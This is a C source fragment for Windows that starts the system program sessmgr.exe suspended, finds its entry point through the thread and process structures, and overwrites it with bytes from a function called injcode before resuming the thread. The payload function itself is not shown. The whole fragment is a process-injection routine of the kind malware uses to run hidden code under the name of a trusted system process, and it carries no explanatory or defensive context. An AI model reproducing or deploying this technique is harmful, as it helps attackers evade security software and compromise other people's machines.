void main(void)
{
STARTUPINFO sinfo;
PROCESS_INFORMATION pinfo;
CONTEXT context;
LDT_ENTRY sel;
DWORD read,tib,peb,exebase,peoffs,ep;
IMAGE_NT_HEADERS pehdr;
int len;
char sessmgr[MAX_PATH+13];
char buffer[2048];

GetSystemDirectory(sessmgr,MAX_PATH);
sessmgr[MAX_PATH]=0;
strcat(sessmgr,"\\sessmgr.exe");
memset(&sinfo,0,sizeof(sinfo));
sinfo.cb=sizeof(sinfo);

if (!CreateProcess(sessmgr,NULL,NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,&sinfo,&pinfo))
printf("createprocess failed"), exit(1);

context.ContextFlags=CONTEXT_FULL;
GetThreadContext(pinfo.hThread,&context);
GetThreadSelectorEntry(pinfo.hThread,context.SegFs,&sel);
tib=sel.BaseLow|(sel.HighWord.Bytes.BaseMid<<16)|(sel.HighWord.Bytes.BaseHi<<24);
ReadProcessMemory(pinfo.hProcess,(LPCVOID)(tib+0x30),&peb,4,&read);
ReadProcessMemory(pinfo.hProcess,(LPCVOID)(peb+0x08),&exebase,4,&read);

ReadProcessMemory(pinfo.hProcess,(LPCVOID)(exebase+0x3C),&peoffs,4,&read);
ReadProcessMemory(pinfo.hProcess,(LPCVOID)(exebase+peoffs),&pehdr,sizeof(pehdr),&read);
ep=exebase+pehdr.OptionalHeader.AddressOfEntryPoint;

len=injcode(buffer);
VirtualProtect((LPVOID)ep,len,PAGE_EXECUTE_READWRITE,&read);
WriteProcessMemory(pinfo.hProcess,(LPVOID)ep,buffer,len,&read);

ResumeThread(pinfo.hThread);
}